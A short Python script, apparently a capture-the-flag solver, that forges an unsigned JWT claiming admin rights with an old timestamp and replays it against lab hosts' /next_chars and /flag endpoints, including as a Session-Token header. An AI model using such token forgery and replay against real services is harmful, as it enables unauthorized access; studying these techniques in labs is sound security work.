#!/usr/bin/env python3
import base64, json, requests, time

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

def make_jwt(admin, timestamp):
    h = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    p = b64url(json.dumps({"admin": admin, "timestamp": timestamp}, separators=(",", ":")).encode())
    return f"{h}.{p}.deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdea"

SECRET = "77.20.124.58"   # update if lab reset
MAGIC = "magic-key.hkn"

OLD_TS = 1300000000  # exact value from the historical pcap's "successful" JWT

jwt_old = make_jwt(True, OLD_TS)
print(f"JWT (admin:true, timestamp=1300000000): {jwt_old}\n")

print("### Querying secret-server /next_chars?char=s REPEATEDLY with the OLD-timestamp JWT ###")
s = requests.Session()
responses = []
for i in range(12):
    r = s.get(f"http://{SECRET}/next_chars", params={"char": "s"}, headers={"JWT": jwt_old}, timeout=5)
    print(f"  call {i}: {r.status_code}: {r.text.strip()}")
    responses.append(r.text.strip())
    time.sleep(0.5)

print("\n### Also try other chars with the old-timestamp JWT, in case the entry point differs ###")
for c in "abcdefghijklmnopqrstuvwxyz0123456789":
    r = requests.get(f"http://{SECRET}/next_chars", params={"char": c}, headers={"JWT": jwt_old}, timeout=4)
    body = r.text.strip()
    if r.status_code == 200 and body not in ("[]", ""):
        print(f"  char={c!r} -> {r.status_code}: {body}")

print("\n### Also try the old-timestamp JWT directly against magic-key.hkn ###")
for path, params in [("/flag", None), ("/next_chars", {"char": "s"})]:
    r = requests.get(f"http://{MAGIC}{path}", params=params, headers={"JWT": jwt_old}, timeout=5)
    print(f"  {path} -> {r.status_code}: {r.text.strip()[:200]}")

print("\n### And as the Session-Token value on magic-key.hkn ###")
for extra_header, extra_val in [("URL", "/flag"), ("URL-Maybe", "/flag")]:
    r = requests.get(f"http://{MAGIC}/flag", headers={"Session-Token": jwt_old, extra_header: extra_val}, timeout=5)
    print(f"  Session-Token=JWT + {extra_header} -> {r.status_code}: {r.text.strip()[:200]}")
